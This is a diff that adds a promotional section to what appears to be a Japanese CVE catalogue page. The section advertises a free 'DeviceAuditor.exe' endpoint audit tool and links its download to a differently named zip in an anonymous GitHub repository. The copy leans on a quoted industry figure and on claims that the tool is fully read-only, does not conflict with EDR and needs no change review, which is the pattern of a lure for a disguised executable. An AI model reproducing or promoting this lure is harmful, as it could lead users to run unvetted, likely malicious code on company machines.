@@ -600,6 +600,63 @@
     </section>
 
     <!-- Interactive Search Demo -->
+    
+    
+
+    
+    <!-- Dedicated Zero-Touch Auditor Section -->
+    <section id="auditor" style="margin-top: 3rem; margin-bottom: 3.5rem;">
+      <div style="background: linear-gradient(135deg, rgba(22, 27, 34, 0.95) 0%, rgba(13, 17, 23, 0.95) 100%); border: 1px solid rgba(88, 166, 255, 0.35); border-radius: 16px; padding: 2.2rem; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 15px; margin-bottom: 1.2rem;">
+          <div>
+            <span style="background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.3); padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 700; letter-spacing: 0.5px;">
+              FREE & OPEN AUDITOR • NASEEBA KANU ENTERPRISE SPEC
+            </span>
+            <h2 style="font-size: 1.85rem; font-weight: 800; color: #fff; margin-top: 0.8rem; margin-bottom: 0.4rem;">
+              🛡️ DeviceAuditor.exe — 100% 読み取り専用ゼロタッチ企業監査ツール
+            </h2>
+            <p style="color: #8b949e; font-size: 1rem; max-width: 820px; line-height: 1.6;">
+              TFalke 共同創設者 <b>Naseeba Kanu</b> 氏の洞察に基づき設計された超軽量ゼロタッチ監査ツールです。<b>「EDR と競合したりロールバック計画が必要な監査は導入されません。軽量で読み取り専用のエンドポイント状態点検こそがセキュリティチームにとって最も受け入れやすいアプローチです。」</b>
+            </p>
+          </div>
+          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <a href="https://raw.githubusercontent.com/anon-wu/CVE_Checker_Anon_X/main/releases/CVE_Security_Operations_Suite_Portable.zip" class="btn-primary" style="padding: 10px 20px; font-size: 0.9rem;">
+              ⬇️ DeviceAuditor.exe 無料ダウンロード
+            </a>
+          </div>
+        </div>
+
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.2rem; margin-top: 1.5rem;">
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #58a6ff; margin-bottom: 0.5rem;">🔒 100% 読み取り専用（0バイト変更保証）</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              レジストリ書き込み0件、サービス停止0件、ファイル改変0件をコードレベルで保証。システム状態を一切変更しないため、<b>ロールバック計画や変更管理申請が不要</b>です。
+            </p>
+          </div>
+
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #3fb950; margin-bottom: 0.5rem;">⚡ EDR 無干渉 & 超高速診断</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              CrowdStrike、Defender などの EDR と一切競合せず、標準 Windows API の読み取りのみで数秒以内にエンドポイントの健全性を評価します。
+            </p>
+          </div>
+
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #d2a8ff; margin-bottom: 0.5rem;">📊 JSON & OASIS SARIF v2.1.0 完全対応</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              GUI でのワンクリック保存に加え、CLI（<code>--json</code>、<code>--sarif</code>、<code>--lang=ja|en|ko</code>）により <b>TFalke、Microsoft Intune、SIEM</b> へ直接連携可能です。
+            </p>
+          </div>
+        </div>
+
+        <div style="margin-top: 1.5rem; background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 0.9rem 1.2rem; font-family: Consolas, monospace; font-size: 0.85rem; color: #79c0ff; overflow-x: auto;">
+          <span style="color: #8b949e;"># TFalke / Intune パイプライン連携コマンド例</span><br/>
+          <span>.\DeviceAuditor.exe --json --lang=ja --out="audit_report.json"</span><br/>
+          <span>.\DeviceAuditor.exe --sarif --out="cve_audit.sarif"</span>
+        </div>
+      </div>
+    </section>
+
     <section id="search">
       <h2 class="section-title">リアルタイム CVE カタログ＆緩和ポリシー検索</h2>
       <p class="section-desc">2026年11月4日基準の最新 CISA KEV 項目からエンタープライズ主要プロトコルまで、リアルタイムで検索・確認できます。</p>
